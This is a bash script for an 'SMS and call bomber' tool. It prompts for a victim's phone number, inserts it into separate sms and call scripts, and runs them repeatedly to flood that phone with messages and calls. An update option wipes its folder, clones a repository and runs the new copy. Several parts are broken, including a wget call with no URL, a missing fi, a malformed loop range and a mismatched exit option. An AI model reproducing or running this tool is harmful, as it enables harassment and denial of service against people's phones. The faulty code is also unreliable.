# Auther : Simple hacker1
# Powered By Chai bala
# Date 18 11 2021
logo(){
    echo -e '                                                                                                           
\e[91m       _/_/_/  _/                            _/           
\e[92m    _/            _/_/_/  _/_/    _/_/_/    _/    _/_/    
\e[92m     _/_/    _/  _/    _/    _/  _/    _/  _/  _/_/_/_/   
\e[92m        _/  _/  _/    _/    _/  _/    _/  _/  _/          
\e[92m _/_/_/    _/  _/    _/    _/  _/_/_/    _/    _/_/_/     
\e[92m                              _/                          
\e[91m                             _/                           
                                                                       
\e[91m     _/    _/                      _/                              _/   
\e[92m    _/    _/    _/_/_/    _/_/_/  _/  _/      _/_/    _/  _/_/  _/_/    
\e[92m   _/_/_/_/  _/    _/  _/        _/_/      _/_/_/_/  _/_/        _/     
\e[92m  _/    _/  _/    _/  _/        _/  _/    _/        _/          _/      
\e[91m _/    _/    _/_/_/    _/_/_/  _/    _/    _/_/_/  _/          _/       
'

echo -e '            \e[93m::: Auther Simplehacker1 :::\e[0m'
echo -e '            \e[93m::: github.com/Simplehacker1 :::\e[0m'
echo -e '                \e[32m Sms And call Bomber \e[0m\n'                           
}
clear
logo

serverCheck(){
rm httpserver.txt
wget 
if grep -q Broken httpserver.txt
then  
 echo Sever Worked
 main
else
 echo Tempeture serve Stoping
fi
}

updateCheck(){
if grep -q truelove httpserver.txt
then
 starting
 echo updateing
 cd ..
 rm -rf SHBOMBER
 logo
 git clone https://github.com/simplehacker01/SHBOMBER
 clear
 logo
 cd SHBOMBER
 bash shbomber.sh
 exit
}


smsbomber(){
    clear
    logo
    starting
    echo "\e[91m"
    echo "Note : Do Not Enter +91 or 91 "
    echo -n "Enter Your Victim phone No : "
    read smsphone
    cp -r sms fuck 
    sed -i -e s/fucking/"$smsphone"/g fuck
    for i in {1...4}
    do bash fuck
    done 
    rm fuck
    exit
}

callbomber(){
    clear 
    logo
    starting
    echo "\e[91m"
    echo "Note : Do Not Enter +91 or 91 "
    echo -n "Enter Your Victim phone No : "
    read smsphone
    cp -r call fuck
    sed -i -e s/fucking/"$smsphone"/g fuck
    for i in {1...4}
    do bash fuck
    done 
    rm fuck
    exit
}
Auther(){ 
count=0
a=`echo -e "\t\t\t\t\t\t\t\t\t\t\t\t  \e[92m       \t\t\t      Auhter : Simple hacker \n\n"`
while [ $count -lt $((${#a}+1)) ]
do
    x=`expr substr "$a"  $count 1`
    if [ "$x" != " " ]
    then
        echo -n $x
        sleep 0.2
    else echo -n " "
    fi
    count=$(($count+1))
done
echo " " 
}

starting(){
count=0
a=`echo -e "Starting ..\t..\t..\t..\t..\t..\t..\t..\t..\t..\t..\t..\t..\e[92m..\t.\t\n Started \n\n "`
while [ $count -lt $((${#a}+1)) ]
do
    x=`expr substr "$a"  $count 1`
    if [ "$x" != " " ]
    then
        echo -n $x
        sleep 0.2
    else echo -n " "
    fi
    count=$(($count+1))
done
echo " " 

}


menu(){
	normal=`echo "\033[97m"` 
	number=`echo "\033[33m"` 
	fgred=`echo "\033[31m"`
    #bcg=`echo "\033[5m"`
    
          printf "\t\t ${bcg}${normal}*********************************************${bcg}\n"
          printf "\t\t ${normal}   1)${normal}Sms Bomber${normal}\n\n" 
          printf "\t\t ${normal}   2)${normal}Call Bomber${normal}\n\n"           
          printf "\t\t ${normal}   3)${normal}Update check${normal}\n\n"
          printf "\t\t ${normal}   4)$normal} Auther${normal}\n\n"
          printf "\t\t ${normal}   x)${normal} EXIT ${normal}\n\n"
          printf "\t\t ${normal}${normal}*********************************************${normal}${normal}\n"
          printf "\t\t ${normal}Please enter A No ${fgred} ${normal}: "
          read simplehacker
          if [ $simplehacker -eq 1 ];then
          smsbomber
          fi
          if [ $simplehacker -eq 2 ];then
          callbomber
          fi
          if [ $simplehacker -eq 3 ];then
          serverCheck

          fi
          if [ $simplehacker -eq 4 ];then
          Auther
          fi
          if [ $simplehacker -eq 5 ];then
          printf " Exiting ......"
          exit
          else
          menu
          fi
}

menu


